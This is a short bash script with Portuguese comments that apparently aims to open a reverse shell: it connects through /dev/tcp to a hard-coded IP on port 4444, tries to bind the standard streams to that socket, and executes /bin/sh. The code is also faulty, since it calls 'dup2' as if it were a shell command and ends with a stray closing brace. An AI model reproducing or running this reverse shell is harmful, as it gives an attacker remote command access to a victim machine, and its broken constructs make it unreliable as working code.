#!/bin/bash

IP="192.168.226.136"
PORT=4444

exec 3<>/dev/tcp/$IP/$PORT

if [ $? -ne 0 ]; then
    echo "Erro ao criar o socket"
    exit 1
fi

# Redireciona stdin, stdout e stderr para o socket
for i in 0 1 2; do
    dup2 3 $i
done

# Executa /bin/sh
exec /bin/sh

}

